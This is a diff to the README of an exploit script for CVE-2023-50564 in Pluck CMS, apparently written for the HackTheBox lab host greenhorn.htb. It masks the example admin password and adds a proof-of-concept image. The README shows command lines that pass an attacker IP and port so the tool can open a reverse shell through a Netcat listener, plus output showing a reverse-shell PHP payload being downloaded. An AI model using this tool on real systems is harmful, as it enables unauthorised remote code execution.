@@ -31,14 +31,14 @@ Before running the script, ensure the following:
 ### Arguments:
 
 - `-h <host>`: The target host (e.g., `greenhorn.htb`).
-- `-P <password>`: The password for the Pluck CMS admin panel (e.g., `iloveyou1`).
+- `-P <password>`: The password for the Pluck CMS admin panel (e.g., `abcd123`).
 - `-i <IP>`: The attacker's IP address to receive the reverse shell.
 - `-p <port>`: The port on which the Netcat listener is running to capture the reverse shell.
 
 ### Example:
 
 ```bash
-./CVE-2023-50564 -h greenhorn.htb -P iloveyou1 -i 10.10.16.7 -p 9001
+./CVE-2023-50564 -h greenhorn.htb -P ********* -i 10.10.16.7 -p 9001
 ```
 
 ---
@@ -60,7 +60,7 @@ Before running the script, ensure the following:
 2. **Run the script**: Provide the required parameters to the script, including the host, password, IP address, and port.
 
    ```bash
-   ./CVE-2023-50564 -h greenhorn.htb -P iloveyou1 -i 10.10.16.7 -p 9001
+   ./CVE-2023-50564 -h greenhorn.htb -P ********* -i 10.10.16.7 -p 9001
    ```
 
 3. **Script Execution**: 
@@ -73,10 +73,15 @@ Before running the script, ensure the following:
 
 ---
 
+### POC
+
+![image](https://github.com/user-attachments/assets/39a2d5be-0d82-4acb-9401-5fe2c7b421e3)
+
+
 ## Output Example
 
 ```bash
-./CVE-2023-50564 -h greenhorn.htb -P iloveyou1 -i 10.10.16.7 -p 9001
+./CVE-2023-50564 -h greenhorn.htb -P ********* -i 10.10.16.7 -p 9001
 Netcat listener detected on port 9001.
 Downloading reverse shell PHP exploit...
 updating: love.php (deflated 60%)
